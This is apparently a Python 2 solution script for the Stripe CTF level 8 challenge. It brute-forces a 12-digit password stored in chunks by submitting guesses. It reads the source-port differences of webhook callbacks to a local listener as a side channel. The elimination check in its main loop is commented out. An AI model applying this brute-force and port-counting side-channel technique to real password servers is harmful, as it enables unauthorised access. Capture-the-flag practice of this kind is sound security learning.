#!/usr/bin/env python 

import socket
import urllib2
import time
import csv
import sys
from multiprocessing import Process
from math import sqrt

KNOWN = "123456789"
UNKNOWN = '0'*(9-len(KNOWN))

ON_STRIPE = False

if ON_STRIPE:
    PRIMARY_SERVER = "https://level08-1.stripe-ctf.com/user-xgxyqyxucz/"
    WEBHOOK = "level02-3.stripe-ctf.com"
    EXPECTED = 2
else:
    PRIMARY_SERVER = "http://127.0.0.1:5000"
    WEBHOOK = "127.0.0.1"
    EXPECTED = 4

host = ''
port = 51230
backlog = 5
size = 1024
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while 1:
    try:
        s.bind((host,port))
        break
    except socket.error:
        port += 1
s.listen(backlog)

start_port = 1024
start_time = time.time()
start_port_init = False

def wait_for_response():
    client, address = s.accept()
    data = client.recv(size)
    if data:
        result = address[1]
    client.close()
    return result

def submit_request(password):
    result = urllib2.urlopen(PRIMARY_SERVER, '''{"password": "%s", "webhooks": ["%s:%s"]}''' % (password, WEBHOOK, port))
    if "true" in result.read():
        print "password successful: %s" % password

def request_port(password):
    p = Process(target=submit_request, args=(password,))
    p.start()
    result = wait_for_response()
    p.join()
    return result

def gen_pw(i):
    return KNOWN + "%03d" % i + UNKNOWN

PREV = 0
def test_password(password):
    global PREV
    result = request_port(password)
    delta = result - PREV
    PREV = result
    return delta

def scan_possibles():
    global PREV
    to_test = set(range(0,1000))
    round = 0
    PREV = request_port('0'*12)
    while len(to_test) > 1:
        print "starting round %d" % round
        to_remove = set()
        for val in to_test:
            test_pw = gen_pw(val)
            print "testing %s" % test_pw
            submit_request(test_pw)
            #if test_password(test_pw) == EXPECTED:
            #    to_remove.add(val)
        print "eliminating %d possibilities" % len(to_remove)
        to_test.difference_update(to_remove)
        round += 1
    print "value is %s" % to_test
    return to_test

def write_data(path, data):
    fh = open(path, 'w')
    w = csv.writer(fh)
    w.writerows(data)
    fh.close()

if __name__ == "__main__":
    scan_possibles()

